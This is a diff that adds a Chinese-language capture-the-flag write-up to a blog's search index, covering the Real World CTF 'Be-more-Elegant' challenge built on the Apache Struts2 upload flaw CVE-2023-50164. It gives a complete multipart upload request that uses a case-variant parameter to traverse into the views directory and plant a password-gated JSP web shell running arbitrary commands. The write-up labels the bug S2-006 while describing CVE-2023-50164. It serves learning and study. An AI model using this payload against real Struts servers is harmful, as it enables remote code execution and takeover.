@@ -62,4 +62,43 @@
         <tag>Security</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Real World CTF 6th Be-more-Elegant</title>
+    <url>/2024/02/05/Real-World-CTF-6th-Be-more-Elegant/</url>
+    <content><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Struts2 是一个开源的 Java Web 应用程序开发框架，旨在帮助开发人员构建灵活、可维护和可扩展的企业级Web应用程序。CVE-2023-50164 Apache Struts文件上传漏洞，攻击者可利用该漏洞污染相关上传参数导致目录遍历，可导致上传webshell，执行任意代码。</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先要知道，这道题考察的是Struts2 S2-006漏洞。</p>
+<p>题目提供了附件下载，下载下来后是一个ROOT.war，解压后查看WEB-INF文件下有class文件，首先通过反编译查看源码，这里使用的反编译工具是jad：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad.exe -o -r -s java -d src HeaderIconAction.class</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102149083.png" alt=" "></p>
+<p>进行源代码审计，通过查看<code>be.more.elegant.filter.JspFilter#doFilter</code>发现只有在<code>view</code>文件夹下才能够运行jsp文件，其他目录下都被过滤了：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102213824.png" alt=" "></p>
+<p>审计<code>be.more.elegant.HeaderIconAction#doUpload</code>对应的路由是<code>/upload.action</code></p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102244277.png" alt=" "></p>
+<ul>
+<li><code>String remoteAddr = request.getRemoteAddr(); </code>这行代码从<code>request</code>对象中获取远程客户端（即上传文件的用户）的 IP 地址。</li>
+<li><code>String md5ForIp = md5Ip(remoteAddr);</code> 这行调用了一个名为 <code>md5Ip</code> 的方法，输入参数是远程地址（客户端的 IP），并返回该 IP 地址的 MD5 散列值。</li>
+<li><code>File sandBox = new File(UPLOAD_DIR, md5ForIp);</code> 这行代码创建了一个 <code>File</code> 对象，代表一个目录，该目录位于一个名为<code>UPLOAD_DIR</code>的父目录下，目录名为该 IP 的 MD5 散列值。</li>
+<li><code>File fileToCreate = new File(sandBox, fileUploadFileName);</code>这行代码创建了一个新的<code>File</code>对象，代表要创建的文件，它位于上一步创建的沙箱目录下，文件名由变量 	<code>fileUploadFileName</code> 指定。</li>
+<li><code>FileUtils.copyFile(fileUpload, fileToCreate);</code>使用 Apache Commons IO 库的<code>FileUtils.copyFile</code> 方法将上传的文件（<code>fileUpload</code>）复制到新位置（<code>fileToCreate</code>）。</li>
+<li><code>uploadedPath = (new StringBuilder()).append(&quot;statics/uploads/&quot;).append(md5ForIp).append(&quot;/&quot;).append(fileUploadFileName).toString(); </code>这行代码构建了上传文件的相对路径字符串，并将其赋值给 <code>uploadedPath</code> 变量。</li>
+</ul>
+<p><strong>由于Struts2 对大小写不敏感</strong>，所以我们可以使用改变大小写对fileUploadFileName进行二次赋值，让实际的<code>fileUploadFileName</code>内容改编为<code>../../../views/o.jsp</code>，这样就可以把jsp文件放到<code>views</code>目录下了。</p>
+<p>首先尝试上传一个正常的文件。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102437081.png" alt=" "></p>
+<p>构造的payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.99.57.31:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>685</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.99.57.31:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryemKDB99p3kAaJnPT</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.99.57.31:8080/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=EC1208381C17F7FE1D9579D14E3BD86C</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryemKDB99p3kAaJnPT</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;FileUpload&quot;; filename=&quot;o.jsp&quot;		#首字母要大写</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;%</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">if</span>(&quot;666&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span></span><br><span class="line"><span class="language-pgsql">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(&quot;o&quot;)).getInputStream();</span></span><br><span class="line"><span class="language-pgsql">        <span class="type">int</span> a = <span class="number">-1</span>;</span></span><br><span class="line"><span class="language-pgsql">        byte[] b = <span class="built_in">new</span> byte[<span class="number">2048</span>];</span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">out</span>.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.<span class="keyword">read</span>(b))!=<span class="number">-1</span>)&#123;</span></span><br><span class="line"><span class="language-pgsql">            <span class="keyword">out</span>.println(<span class="built_in">new</span> String(b));</span></span><br><span class="line"><span class="language-pgsql">        &#125;</span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">out</span>.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="language-pgsql">    &#125;</span></span><br><span class="line"><span class="language-pgsql">%&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryemKDB99p3kAaJnPT</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;fileUploadFileName&quot;;		# 这里首字母要小写，要加上FileName</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../../../views/o.jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryemKDB99p3kAaJnPT--</span></span></span><br></pre></td></tr></table></figure>
+
+<p>结果显示上传成功</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102551248.png" alt=" "></p>
+<p>访问<code>http://&lt;ip&gt;/views/o.jsp?pwd=666&amp;o=./readflag</code>获取flag值<code>rwctf&#123;Y0U K0wn S2 sooooo!!! w3ll&#125;</code></p>
+]]></content>
+      <categories>
+        <category>Security</category>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
 </search>
